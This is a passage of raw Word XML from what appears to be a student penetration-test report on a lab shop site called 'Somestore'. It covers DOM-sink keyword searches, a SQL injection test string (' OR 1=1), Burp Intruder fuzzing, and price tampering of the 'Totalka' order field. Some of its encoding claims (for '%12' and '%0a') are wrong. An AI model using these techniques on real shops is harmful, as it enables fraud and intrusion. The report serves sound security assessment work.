      <w:r w:rsidR="008A4195">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0082495A">
        <w:t>https</w:t>
      </w:r>
      <w:r w:rsidR="008A4195">
        <w:t xml:space="preserve">, so any SSL vulnerabilities detected will not be present. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0868F60D" w14:textId="042F92CA" w:rsidR="00D57C95" w:rsidRDefault="00E42548" w:rsidP="00E42548">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="51" w:name="_Toc531104370"/>
      <w:r>
        <w:t>Miscellaneous checks</w:t>
      </w:r>
      <w:bookmarkEnd w:id="51"/>
    </w:p>
    <w:p w14:paraId="6289552E" w14:textId="41DC2B53" w:rsidR="003D264F" w:rsidRDefault="00E42548" w:rsidP="00E42548">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="52" w:name="_Toc531104371"/>
      <w:r>
        <w:t>Check for DOM-Based Attacks</w:t>
      </w:r>
      <w:bookmarkEnd w:id="52"/>
    </w:p>
    <w:p w14:paraId="32457172" w14:textId="2F4BC50E" w:rsidR="008B21C2" w:rsidRDefault="008B21C2" w:rsidP="008B21C2">
      <w:r>
        <w:t>The script that was used previously to search for th</w:t>
      </w:r>
      <w:r w:rsidR="00C31055">
        <w:t>e keyword ‘hidden’, as seen in A</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ppendix E, was modified to search all </w:t>
      </w:r>
      <w:r w:rsidR="00C31055">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>JavaScript files for the following strings:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15BDC1B8" w14:textId="0BAE2170" w:rsidR="00E42548" w:rsidRDefault="008B21C2" w:rsidP="008B21C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>“</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>document.location</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09792410" w14:textId="64AF0184" w:rsidR="008B21C2" w:rsidRDefault="008B21C2" w:rsidP="008B21C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>“document.URL”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DA0DA1" w14:textId="3991E443" w:rsidR="008B21C2" w:rsidRDefault="008B21C2" w:rsidP="008B21C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>“</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>document.URLUnencoded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CEE9FE7" w14:textId="6B6B4091" w:rsidR="008B21C2" w:rsidRDefault="008B21C2" w:rsidP="008B21C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>“</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>document.referrer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C98FD94" w14:textId="31BD7EDB" w:rsidR="008B21C2" w:rsidRDefault="008B21C2" w:rsidP="008B21C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>“</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>window.location</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB8766B" w14:textId="7B552A4F" w:rsidR="008B21C2" w:rsidRDefault="008B21C2" w:rsidP="008B21C2">
      <w:r>
        <w:t xml:space="preserve">These </w:t>
      </w:r>
      <w:r w:rsidR="00C31055">
        <w:t>strings</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> were searched for, as if they were found then they could present an area for a DOM-Based attack. However, none of the keywords were found in any of the JavaScript files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ABBC2AF" w14:textId="6C5D8545" w:rsidR="00E42548" w:rsidRDefault="008B21C2" w:rsidP="008B21C2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="53" w:name="_Toc531104372"/>
      <w:r>
        <w:t>Check for Local Privacy Vulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="53"/>
    </w:p>
    <w:p w14:paraId="157FEDF9" w14:textId="66D1B42B" w:rsidR="00E42548" w:rsidRDefault="008B21C2" w:rsidP="00E42548">
      <w:r>
        <w:t xml:space="preserve">The cookies created by the server contain sensitive information about the users, and do not have an expiry date. All information contained about the cookies can be found in previous sections, and </w:t>
      </w:r>
      <w:r w:rsidR="00E8485F">
        <w:t>no further information will be discussed here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F9B2E9" w14:textId="6C5DB75F" w:rsidR="00E8485F" w:rsidRDefault="00070F56" w:rsidP="00E42548">
      <w:r>
        <w:t>The cache is not used within the application, as in all responses it uses the must-revalidate directive.</w:t>
      </w:r>
      <w:r w:rsidR="00217673">
        <w:t xml:space="preserve"> An example of this is seen in Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>46</w:t>
      </w:r>
      <w:r w:rsidR="00217673">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E6B499" w14:textId="77777777" w:rsidR="00217673" w:rsidRDefault="00217673" w:rsidP="00217673">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="73EED418" wp14:editId="2C4B98F4">
            <wp:extent cx="4667250" cy="5524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7250" cy="552450"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E278ED" w14:textId="7C73CB81" w:rsidR="00217673" w:rsidRDefault="00217673" w:rsidP="00217673">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46</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Cache</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3019A3" w14:textId="5CB564CE" w:rsidR="00152332" w:rsidRDefault="00152332" w:rsidP="00E42548">
      <w:r>
        <w:t>There are two pages that contain sensitive data for the user – the checkout page and the personal details page. In both these pages the html source code was checked for the autocomplete attribute. In both pages</w:t>
      </w:r>
      <w:r w:rsidR="00C31055">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the attribute was present and set to off, meaning that the data i</w:t>
      </w:r>
      <w:r w:rsidR="00217673">
        <w:t>s not stored within the browser</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="658D2129" w14:textId="4B1E03C6" w:rsidR="00E42548" w:rsidRDefault="00217673" w:rsidP="005A7B51">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="54" w:name="_Toc531104373"/>
      <w:r>
        <w:t>Check for Weak SSL C</w:t>
      </w:r>
      <w:r w:rsidR="005A7B51">
        <w:t>iphers</w:t>
      </w:r>
      <w:bookmarkEnd w:id="54"/>
    </w:p>
    <w:p w14:paraId="164B72FC" w14:textId="69D9F77A" w:rsidR="00E42548" w:rsidRDefault="008A4195" w:rsidP="00E42548">
      <w:r>
        <w:t xml:space="preserve">The Somestore web application does not use https, therefore no SSL ciphers are present. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6599BD96" w14:textId="6BD0269F" w:rsidR="00E42548" w:rsidRPr="00E42548" w:rsidRDefault="00E85F82" w:rsidP="00E42548">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="55" w:name="_Toc531104374"/>
      <w:r>
        <w:t>Testing</w:t>
      </w:r>
      <w:r w:rsidR="00217673">
        <w:t xml:space="preserve"> for Input V</w:t>
      </w:r>
      <w:r>
        <w:t>alidation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="55"/>
    </w:p>
    <w:p w14:paraId="30974171" w14:textId="7D20DACE" w:rsidR="00DB0AFF" w:rsidRDefault="00DB0AFF" w:rsidP="002741D4">
      <w:r>
        <w:t xml:space="preserve">In the login page, the syntax </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>‘ OR</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 1=1 was entered in both the username and password field, to test if the input was blocked or not. The </w:t>
      </w:r>
      <w:r w:rsidR="00E85F82">
        <w:t>outcome</w:t>
      </w:r>
      <w:r w:rsidR="00217673">
        <w:t xml:space="preserve"> is shown in F</w:t>
      </w:r>
      <w:r w:rsidR="008A4E2D">
        <w:t xml:space="preserve">igure </w:t>
      </w:r>
      <w:r w:rsidR="00D765D5">
        <w:t>47</w:t>
      </w:r>
      <w:r w:rsidR="00E85F82">
        <w:t xml:space="preserve"> where an error message </w:t>
      </w:r>
      <w:r w:rsidR="00217673">
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="00E85F82">
        <w:t xml:space="preserve"> displayed</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C3C9BDC" w14:textId="77777777" w:rsidR="005B2A92" w:rsidRDefault="005B2A92" w:rsidP="005B2A92">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="103621F2" wp14:editId="2D2B5A5C">
            <wp:extent cx="4076700" cy="1714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76700" cy="1714500"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3441A8" w14:textId="1B4CCEB1" w:rsidR="005B2A92" w:rsidRDefault="005B2A92" w:rsidP="005B2A92">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47</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:r w:rsidRPr="00F97CA3">
        <w:t>Error message</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C4C83A" w14:textId="5FC6EB6F" w:rsidR="00767C91" w:rsidRDefault="00767C91" w:rsidP="002741D4">
      <w:r>
        <w:t>On the contact us page, a packet is captured using</w:t>
      </w:r>
      <w:r w:rsidR="00AA1E24">
        <w:t xml:space="preserve"> burp and sent to burp intruder</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to fuzz the data entered into the name parameter. The name parameter has been chosen as it returns the data entered on the thank you page. A large amount of strings that contain different values were entered into the payload section. These pa</w:t>
      </w:r>
      <w:r w:rsidR="00AA1E24">
        <w:t>yloads can be seen in A</w:t>
      </w:r>
      <w:r w:rsidR="00217673">
        <w:t>ppendix H</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1BF190" w14:textId="07161BC5" w:rsidR="00CE04F2" w:rsidRDefault="00CE04F2" w:rsidP="002741D4">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">From the results, it was derived that if the </w:t>
      </w:r>
      <w:r w:rsidR="00217673">
        <w:t>input</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> contains a</w:t>
      </w:r>
      <w:r w:rsidR="005B2A92">
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005B2A92">
        <w:t>apostrophe</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then the SQL syntax will throw an error. It was also found that certain </w:t>
      </w:r>
      <w:r w:rsidR="000F64D2">
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> encoded characters are decrypted, however not to the </w:t>
      </w:r>
      <w:r w:rsidR="000F64D2">
        <w:t>ASCII</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000F64D2">
        <w:t>equivalent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00E85F82">
        <w:t>Whereas o</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ther </w:t>
      </w:r>
      <w:r w:rsidR="000F64D2">
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> encoded characters are dropped. For example, if “%12” is ente</w:t>
      </w:r>
      <w:r w:rsidR="000F64D2">
        <w:t xml:space="preserve">red into the name </w:t>
      </w:r>
      <w:r w:rsidR="00E85F82">
        <w:t>field</w:t>
      </w:r>
      <w:r w:rsidR="000F64D2">
        <w:t xml:space="preserve">, then the server responds on the thank you page with an arrow symbol. However, the ASCII value for </w:t>
      </w:r>
      <w:r w:rsidR="00E85F82">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidR="000F64D2">
        <w:t>%12</w:t>
      </w:r>
      <w:r w:rsidR="00E85F82">
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidR="000F64D2">
        <w:t xml:space="preserve"> is the </w:t>
      </w:r>
      <w:r w:rsidR="00E85F82">
        <w:t>letter</w:t>
      </w:r>
      <w:r w:rsidR="000F64D2">
        <w:t xml:space="preserve"> B. The output from the server can be seen in </w:t>
      </w:r>
      <w:r w:rsidR="00C31055">
        <w:t>F</w:t>
      </w:r>
      <w:r w:rsidR="000F64D2">
        <w:t xml:space="preserve">igure </w:t>
      </w:r>
      <w:r w:rsidR="00C31055">
        <w:t>48</w:t>
      </w:r>
      <w:r w:rsidR="000F64D2">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36E411BC" w14:textId="77777777" w:rsidR="000F64D2" w:rsidRDefault="000F64D2" w:rsidP="000F64D2">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5A3FECDB" wp14:editId="73363EC8">
            <wp:extent cx="3057719" cy="52387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3711" cy="526615"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="668919CF" w14:textId="35DD4718" w:rsidR="000F64D2" w:rsidRDefault="000F64D2" w:rsidP="000F64D2">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48</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>- %12</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D08CB37" w14:textId="1A47D22E" w:rsidR="00C80CE0" w:rsidRDefault="000F64D2" w:rsidP="002741D4">
      <w:r>
        <w:t xml:space="preserve">Whereas, if the string “%0a” is entered into the box, which </w:t>
      </w:r>
      <w:r w:rsidR="00E85F82">
        <w:t>in ASCII converts into a semi colon</w:t>
      </w:r>
      <w:r>
        <w:t>, then the string is dropped from the response altogether and is not displayed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C6DF580" w14:textId="2709876A" w:rsidR="00BC7FA6" w:rsidRDefault="005B2A92">
      <w:r>
        <w:t xml:space="preserve">The same </w:t>
      </w:r>
      <w:r w:rsidR="00217673">
        <w:t>payloads</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> were entered into numerous fields on the personal details page to see if this page also decodes </w:t>
      </w:r>
      <w:r w:rsidR="00E85F82">
        <w:t>certain</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> encoded values. It was found that the values were not decoded, however whenever an apostrophe was entered </w:t>
      </w:r>
      <w:r w:rsidR="00E85F82">
        <w:t>in any field</w:t>
      </w:r>
      <w:r>
        <w:t>, that field would not update</w:t>
      </w:r>
      <w:r w:rsidR="00E85F82">
        <w:t xml:space="preserve"> successfully</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Thus</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> meaning that the apostrophe symbol is blocked by the server</w:t>
      </w:r>
      <w:r w:rsidR="008F130A">
        <w:t xml:space="preserve"> on </w:t>
      </w:r>
      <w:r w:rsidR="00217673">
        <w:t>the page</w:t>
      </w:r>
      <w:r w:rsidR="008F130A">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339CA2C8" w14:textId="3A2476D5" w:rsidR="00D61A4D" w:rsidRDefault="00D61A4D">
      <w:r>
        <w:t>Certain fields on the admin page also do not correctly identify the data being entered. In the ‘Add Product’ section of the admin page, regardless of what is entered into the price field, an error message appears. This can be seen in Figure 49.</w:t>
      </w:r>
      <w:r w:rsidR="009E2E0C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="009E2E0C">
        <w:t>Therefore</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="009E2E0C">
        <w:t xml:space="preserve"> even if numbers are entered, the error message is still thrown.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73E16C0F" w14:textId="77777777" w:rsidR="00D61A4D" w:rsidRDefault="00D61A4D" w:rsidP="00D61A4D">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2A4DAF53" wp14:editId="014BDABF">
            <wp:extent cx="4314825" cy="12382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14825" cy="1238250"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="381CDB3F" w14:textId="22DE9DB3" w:rsidR="00D61A4D" w:rsidRDefault="00D61A4D" w:rsidP="00D61A4D">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>49</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - Price error</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2503D2" w14:textId="60A0CFB7" w:rsidR="008F130A" w:rsidRDefault="008F130A" w:rsidP="008F130A">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Test for Data Tampering</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="144D9053" w14:textId="4F75C006" w:rsidR="008F130A" w:rsidRDefault="008F130A" w:rsidP="008F130A">
      <w:r>
        <w:t xml:space="preserve">Testing will occur to establish if it is possible to tamper the data being transmitted when purchasing a product. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735486D6" w14:textId="7ADD426F" w:rsidR="00C7697E" w:rsidRDefault="00E4158A" w:rsidP="008F130A">
      <w:r>
        <w:t>Firefox</w:t>
      </w:r>
      <w:r w:rsidR="00113974">
        <w:t>’s Tamper D</w:t>
      </w:r>
      <w:r w:rsidR="00C7697E">
        <w:t>ata</w:t>
      </w:r>
      <w:r w:rsidR="00113974" w:rsidRPr="00113974">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00113974" w:rsidRPr="00113974">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">(mozdev.org - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00113974" w:rsidRPr="00113974">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>tamperdata</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00113974" w:rsidRPr="00113974">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>: help, 2018)</w:t>
      </w:r>
      <w:r w:rsidR="00C7697E">
        <w:t xml:space="preserve"> tool is used to view each request made throughout the purchasing pr</w:t>
      </w:r>
      <w:r w:rsidR="00113974">
        <w:t>ocess. By using Tamper D</w:t>
      </w:r>
      <w:r w:rsidR="00C7697E">
        <w:t xml:space="preserve">ata, the user can edit the quantity, product ID that they desire and the return </w:t>
      </w:r>
      <w:r w:rsidR="00034EAC">
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidR="00C7697E">
        <w:t xml:space="preserve">. Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D26E52">
        <w:t>50</w:t>
      </w:r>
      <w:r w:rsidR="00C7697E">
        <w:t xml:space="preserve"> shows </w:t>
      </w:r>
      <w:r w:rsidR="00113974">
        <w:t>the Tamper Data popup</w:t>
      </w:r>
      <w:r w:rsidR="00C7697E">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195618D6" w14:textId="77777777" w:rsidR="00C7697E" w:rsidRDefault="00C7697E" w:rsidP="00C7697E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6839F7F2" wp14:editId="031363D0">
            <wp:extent cx="5553075" cy="56292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53075" cy="5629275"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF4116F" w14:textId="57F1A8AD" w:rsidR="00C7697E" w:rsidRDefault="00C7697E" w:rsidP="00C7697E">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50</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Tamper Data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671DBD91" w14:textId="55C808B1" w:rsidR="00C7697E" w:rsidRDefault="00C7697E" w:rsidP="00C7697E">
      <w:r>
        <w:t xml:space="preserve">Following the purchasing process, once the user has submitted all of their personal details, </w:t>
      </w:r>
      <w:r w:rsidR="00B1280A">
        <w:t>Tamper Data</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> can be used to c</w:t>
      </w:r>
      <w:r w:rsidR="00B1280A">
        <w:t>hange the overall price of the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> order. Figure </w:t>
      </w:r>
      <w:r w:rsidR="00C31055">
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00D26E52">
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00B1280A">
        <w:t xml:space="preserve"> shows the Tamper D</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ata fields during the final order process. </w:t>
      </w:r>
      <w:r w:rsidR="00034EAC">
        <w:t>One of the fields is called “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00034EAC">
        <w:t>Totalka</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00034EAC">
        <w:t xml:space="preserve">”, with the price next to it. The user can edit this price to any number that they desire, and this will change the total cost of the order. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC3FD32" w14:textId="77777777" w:rsidR="00C7697E" w:rsidRDefault="00C7697E" w:rsidP="00C7697E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="11584F01" wp14:editId="19E8DE6F">
            <wp:extent cx="5657850" cy="56864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57850" cy="5686425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="63778CF3" w14:textId="5E6FD6EB" w:rsidR="008A4E2D" w:rsidRDefault="00C7697E" w:rsidP="005E0D68">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00D61A4D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>51</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="005E0D68">
        <w:t xml:space="preserve"> - Tamper Data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F50643" w14:textId="1393EEA9" w:rsidR="008A4E2D" w:rsidRDefault="008A4E2D" w:rsidP="008A4E2D">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3773CE" w14:textId="2A9ABFCF" w:rsidR="008A4E2D" w:rsidRDefault="00176584" w:rsidP="008A4E2D">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">A thorough investigation was carried out on the Somestore web application. Testing was carried out on several different platforms with a wide range of exploits being attempted. After such testing was carried out, it was found that the application contains multiple critical vulnerabilities and logic flaws that require patching.   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="694FF941" w14:textId="53A717B6" w:rsidR="008A4E2D" w:rsidRDefault="008A4E2D" w:rsidP="008A4E2D">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:smallCaps w:val="0"/>
          <w:color w:val="auto"/>
